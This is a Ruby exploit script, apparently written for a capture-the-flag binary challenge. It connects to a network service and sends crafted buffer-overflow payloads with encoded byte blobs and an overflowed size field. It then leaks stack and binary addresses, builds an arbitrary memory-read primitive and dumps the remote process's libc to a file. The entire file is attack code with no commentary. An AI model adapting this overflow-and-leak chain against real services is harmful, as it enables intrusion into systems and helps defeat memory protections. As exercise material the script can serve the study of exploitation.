#encoding: BINARY
require 'socket'

class CustomSocket < TCPSocket
  def write string
    super(string)
    flush
  end
end

class Exploit
  def initialize
    @s = CustomSocket.new('localhost', 9999)
    #@s = CustomSocket.new('54.64.111.236', 7777)
  end
  def read_banner
    puts "[*] read_banner"
    puts @s.readline
  end

  def send_header
    payload = "A"*256
#    payload += "\xbd\x5f\x01\xe9\x03\x4e\x51\x13\x9c\xa6\x77\xe3\xf3\xf6\x41\x97\x29\x9a\x28\x8d\xe4\x18\x13\xd9\x36\x85\xc3\xbf\x74\x07\x19\xec\xa5\x8c\xdb\x47\x60\x96\x34\x4a\x88\x67\x64\x98\x35\xce\x9d\x15\x80\xe5\xc9\xb1\x7e\x47\xe4\xef\x78\xb2\x81\xa5\x07\xd4\x67\x4a\x88\x46\x77\x9c\x49\x56\xd0\xec\xc6\x4b\xb2\x3c\x5c\x25\x9a\x14"
    payload += "\xbd\x5f\x01\xe9\x03\x4e\x51\x33\x9c\xa6\x77\xe3\xf3\xf6\x41\x97\x29\x9a\x28\x8d\xe4\x18\x13\xd9\x36\x85\xc3\xbf\x74\x07\x19\x28\xa5\x8c\xdb\x47\x60\x96\x34\x4a\x88\x67\x64\x98\x35\xce\x9d\x77\x80\xe5\xc9\xb1\x7e\x47\xe4\x32\x78\xb2\x81\xa5\x07\xd4\x67\x24\x88\x46\x77\x9c\x49\x56\x88\x74\xc6\x4b\xb2\x3c\x5c\x25\x4a\x0c"
    payload += "A"*80
    payload += [2].pack('<Q')
    payload += "\xC6\xCC\x78\x6B\x6C\xBC\x40\xE3\x25\xA9\xB6\x5A\xB9\x41\x65\x0D\x64\x70\xF9\x32\xE1\xE6\x38\xE8\x34\x5F\x59\xA6\x8B\x7F\x7B\xB8\xD5\x6A\xEC\xB5\x94\x2F\x1D\x9A\x9C\x41\xD9\x27\x0D\xA1\x96\xB1\x24\x39\x54\xAF\xC3\x1C\xC5\x2F\x86\xF8\x7C\x21\x8D\xB5\x0A\x38\x1D\x5B\x0C\xFD\x30\x1E\x48\x48\xD4\xE0\x8C\x94\x11\x57\x9A\x0C\xA5\x29\xEB\x5F\x16\x48\xAE\x96\x26\x8D\x3B\xD5\x48\x15"
    payload += "B"*(101-11)
    
    # TODO : header
#    payload = payload.ljust(0x3d0, "C")
    @s.write(payload)
  end

  def overflow_string num_images, comments, ret = "\xd0\x4d"
    puts "[*] overflow_string" 
    @s.write([0x9A0898].pack('<I'))
    @s.write("\x0A"+"\x00"*(0x88-1))

    payload = "A" * 80
#    payload += [0xFFFFFFFFFFFFECEE].pack('<Q')
    size = (1 << 64) - (0x1320 - 0x5d8 - 0x10)
    payload += [size].pack('<Q')
    payload = payload.ljust(0xd8, "C")
    payload += [comments].pack('<Q')
    payload += "A" * 16
    payload += [num_images].pack('<Q')
    payload += "A"*1496
    payload += ret
    @s.write(payload)
  end

  def leak_memory
    overflow_string 10, 0
    14.times {puts @s.readline}
    @s.readline.scan(/1: \[width: 0, height: ([0-9]+)/)
    @rbp = $1.to_i + 0x5f0
    9.times { puts @s.readline } 
  end

  def leak_binary_memory
    puts "[*] leak_binary_memory"
    create_comment 1
    overflow_string 0, @rbp + 8 - 0x3f
    14.times {@s.readline }

    data = ""
    while data[-2..-1] != "]\n"
      data += @s.readline
    end

    addr = data.slice(": [AAAAAAAA".length, 6) + "\x00"*2
    @binary_base = addr.unpack('<Q')[0] + 0xde9140 - 0x1f80
    puts "[*] binary_base : #{@binary_base.to_s(16)}"
  end

  def arbitrary_memory_read addr
    read_banner
    send_header
    create_comment 1
    overflow_string 0, addr - 0x3f
    14.times { @s.readline }

    data = ""
    while data[-2..-1] != "]\n"
      data += @s.readline
    end
    return data[data.index(": [") + 3..-3]
  end


  def extract_library
    readline
    addr = arbitrary_memory_read @binary_base + 0x205018
    addr = addr.ljust(8, "\x00")
    addr = addr.unpack('<Q')[0]
    addr = addr & 0xfffffffffffff000

    loop do 
      data = arbitrary_memory_read addr
      if data[0..3] == "\x7F\x45\x4C\x46"
        puts "[*] WE FOUND!"
        break
      end
      addr -= 0x1000
    end
    
    puts "[*] base addr : #{addr.to_s(16)}"
    f = open('libc.so', 'wb')
    loop do
      data = arbitrary_memory_read addr
      data += "\x00"
      f.write(data)
      addr += data.length
    end
    f.close()
  end

  def test_read
    p arbitrary_memory_read @binary_base + 0x43ae
  end

  def exploit
    create_comment 1
  end

  def create_comment num_comments
    puts "[*] create_comment : %d" % num_comments
    @s.write([0x45d9dd].pack('<I'))
    @s.write([num_comments].pack('<Q'))
    num_comments.times do |x|
      @s.write("A"*0x50c)
    end
  end

  def create_image width, height, data
    num_images =  1
    @s.write([0xA00131].pack('<I'))
    image_container = "A"*136
    image_container += [num_images].pack('<Q')
    image_container = image_container.ljust(0x210, "B")
    @s.write(image_container)

    num_images.times do |x|
      image_header = (0xd0/2).times.map{|v| "%02X"%v}.join
      image_header = "A"*64
      image_header += [width].pack('<Q') #height
      image_header += "B"*16
      image_header += [height].pack('<Q') #width
      image_header = image_header.ljust(0xd0, "C")
      @s.write(image_header)

      size = width * height * 3
      while (size != 0) do
        buf_size = 4096
        buf_size = size if buf_size > size
        @s.write("=" * buf_size)
        size -= buf_size
      end
    end
  end
end

s = Exploit.new
readline
s.read_banner
s.send_header
s.create_image 0x1, 0x1, ""
s.leak_memory

s.read_banner
s.send_header
s.leak_binary_memory

s.extract_library
